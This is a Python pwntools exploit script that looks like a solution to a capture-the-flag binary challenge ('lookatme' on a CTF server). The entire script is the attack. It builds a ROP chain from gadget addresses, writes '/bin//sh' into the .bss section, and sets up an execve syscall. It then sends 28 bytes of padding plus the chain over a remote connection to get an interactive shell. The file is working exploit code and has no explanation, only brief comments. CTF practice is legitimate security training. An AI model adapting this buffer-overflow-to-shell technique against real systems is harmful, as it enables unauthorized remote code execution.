from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3017)
#r = process('./lookatme')

pop_eax = p32(0x080b81c6)
pop_ebx = p32(0x080bb312)
pop_ecx = p32(0x080de955)
pop_edx = p32(0x0806f02a)
xor_eax = p32(0x08049303)
inc_eax = p32(0x0807a86f)
syscall = p32(0x080d29c3)
mov_edx_eax = p32(0x080549db)

bss = 0x80eb1a8

shellcode = ''

# mov bss, '/bin'
shellcode += pop_edx
shellcode += p32(bss)
shellcode += pop_eax
shellcode += '/bin'
shellcode += mov_edx_eax

# mov bss, '//sh'
shellcode += pop_edx
shellcode += p32(bss+0x4)
shellcode += pop_eax
shellcode += '//sh'
shellcode += mov_edx_eax

# execve args
shellcode += pop_ebx
shellcode += p32(bss)
shellcode += pop_ecx
shellcode += p32(bss+0x9)
shellcode += pop_edx
shellcode += p32(bss+0x9)

# syscall settings -> eax 11
shellcode += xor_eax
shellcode += inc_eax*11

# syscall
shellcode += syscall

payload = ''
payload += "A"*28
payload += shellcode

r.sendlineafter('\n', payload)
r.interactive()
